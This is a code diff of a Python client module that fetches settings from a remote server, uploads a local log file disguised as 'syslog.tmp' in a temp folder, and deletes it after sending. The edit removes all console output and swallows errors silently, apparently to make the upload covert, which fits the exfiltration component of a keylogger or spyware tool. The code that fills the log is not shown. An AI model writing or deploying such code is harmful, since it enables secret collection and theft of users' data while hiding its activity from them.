@@ -1,19 +1,22 @@
+"""
+Client Module - Handles server communication and log transmission
+"""
+
 import os
 import socket
 import platform
 import json
 
-SERVER_IP = "192.168.211.148" 
+SERVER_IP = "localhost" 
 SERVER_PORT = 9999
 
-# Default configuration 
 CONFIG = {
     'send_interval': 10,
     'buffer_size': 1024,
     'retry_attempts': 3
 }
 
-# Log file location
+# OS-specific log file location
 if platform.system() == "Windows":
     log_file = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'syslog.tmp')
 else:
@@ -25,43 +28,31 @@ def get_config_from_server():
         s = socket.socket()
         s.settimeout(5)
         s.connect((SERVER_IP, SERVER_PORT))
-        
-        # config request
+        # Send config request identifier
         s.send(b'C')
-        
-        # Receive config
         config_data = s.recv(1024).decode('utf-8')
         s.close()
-        
-        # update config
+        # Update local config with server settings
         server_config = json.loads(config_data)
         CONFIG.update(server_config)
-        
-        print(f"Received config from server: send_interval={CONFIG['send_interval']}s")
         return True
-        
-    except Exception as e:
-        print(f"Could not get config from server: {e}")
-        print(f"  Using default: send_interval={CONFIG['send_interval']}s")
+    except:
         return False
 
 def send_logs():
-    """Send log file to server and delete after successful send"""
+    """Send log file to server and delete after successful transmission"""
     try:
         s = socket.socket()
         s.settimeout(5)
         s.connect((SERVER_IP, SERVER_PORT))
-        
-        # log upload
+        # Send log upload identifier
         s.send(b'L')
         
-        # Check if log file exists
         if not os.path.exists(log_file):
-            print("No log file to send")
             s.close()
             return False
         
-        # Send the file in chunks
+        # Send file in chunks
         with open(log_file, "rb") as f:
             while True:
                 data = f.read(CONFIG['buffer_size'])
@@ -71,20 +62,14 @@ def send_logs():
         
         s.close()
         
-        # Delete the log file
+        # Delete log file after successful send
         try:
             os.remove(log_file)
-            print("Logs sent and deleted successfully")
         except:
-            print("Logs sent but could not delete file")
+            pass
         
         return True
-        
-    except ConnectionRefusedError:
-        print("Error: Could not connect to server")
-        return False
-    except Exception as e:
-        print(f"Error: {e}")
+    except:
         return False
 
 def get_log_file():
